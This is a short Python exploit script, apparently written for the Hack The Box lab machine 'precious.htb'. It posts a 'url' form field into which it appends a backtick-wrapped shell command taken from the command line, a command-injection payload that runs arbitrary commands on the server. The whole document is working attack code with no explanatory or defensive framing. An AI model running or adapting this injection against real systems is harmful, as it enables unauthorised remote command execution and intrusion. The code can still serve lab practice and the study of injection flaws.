import requests
import sys

URL = "http://precious.htb/"

def send_url(x, url=URL):
    res = requests.post(url, data={
        "url": x,
    })
    return res.text


if __name__ == "__main__":
    print(send_url(f"{sys.argv[1]}"+"%20`"+sys.argv[2]+"`"))